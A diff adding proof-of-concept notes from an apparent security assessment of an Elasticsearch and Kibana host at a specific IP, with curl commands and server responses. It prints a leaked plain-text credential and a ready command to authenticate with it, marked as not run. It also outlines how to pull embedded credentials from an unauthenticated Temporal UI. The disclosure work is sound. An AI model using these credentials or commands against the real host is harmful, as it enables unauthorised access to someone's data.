@@ -1,0 +1,78 @@
+=== POC 1: Elasticsearch 9200 — auth enforced, cluster confirmed alive ===
+Command:
+  curl -ski https://5.78.67.23:9200/
+
+Response:
+  HTTP/1.1 401 Unauthorized
+  WWW-Authenticate: Basic realm="security", charset="UTF-8"
+  WWW-Authenticate: Bearer realm="security"
+  WWW-Authenticate: ApiKey
+  content-type: application/json
+
+  {"error":{"root_cause":[{"type":"security_exception","reason":"missing
+  authentication credentials for REST request [/]"}]},"status":401}
+
+Significance: Elasticsearch cluster at 5.78.67.23:9200 is live and reachable.
+The 401 response + WWW-Authenticate header confirms it accepts Basic auth —
+the exact mechanism the leaked elastic/PzBv81Jo3992T77hVbxN credential uses.
+
+
+=== POC 2: Kibana /api/status — unauthenticated version + hostname disclosure ===
+Command:
+  curl -ski http://5.78.67.23:5601/api/status
+
+Response:
+  HTTP/1.1 200 OK
+  kbn-name: segment-es-01
+  kbn-license-sig: 522beee9f98817275466d5c677bdd316d031127703aa66b44f68d6e255df810b
+
+  {"status":{"overall":{"level":"available"}}}
+
+Significance: No authentication required. Returns HTTP 200. Discloses:
+  - Internal cluster hostname: segment-es-01
+  - Kibana is running and cluster is healthy (level: available)
+  - License signature (cluster fingerprint)
+
+
+=== POC 3: Kibana root — redirects to /login ===
+Command:
+  curl -ski http://5.78.67.23:5601/
+
+Response:
+  HTTP/1.1 302 Found
+  location: /login?next=%2F
+  kbn-name: segment-es-01
+
+Significance: Authentication enforced on all non-status endpoints.
+Combined with Finding 1 credentials: authenticate via /login with
+elastic/PzBv81Jo3992T77hVbxN for full GUI access to the ES cluster.
+
+
+=== POC 4: Credential validation (structural — NOT executed) ===
+Command (not run — ethical stop):
+  curl -sk -u elastic:PzBv81Jo3992T77hVbxN https://5.78.67.23:9200/
+
+Expected response:
+  {
+    "name": "segment-es-01",
+    "cluster_name": "...",
+    "version": { "number": "8.x.x", ... },
+    "tagline": "You Know, for Search"
+  }
+
+This curl was NOT executed. Credentials were obtained from the unauthenticated
+Temporal UI and are documented here as evidence of the finding.
+ES cluster not accessed at any point during this assessment.
+
+
+=== POC 5: Temporal UI — PENDING ===
+Temporal host URL not yet confirmed. Ports 7233/8233/8080 are closed on
+5.78.67.23 — Temporal runs on a separate host.
+
+Once URL is provided:
+  curl -sk http://<temporal-host>:<port>/namespaces
+  → Returns all namespaces without credentials
+
+  curl -sk http://<temporal-host>:<port>/api/v1/namespaces/default/schedules
+  → Returns all schedule configs including embedded ES credentials
+
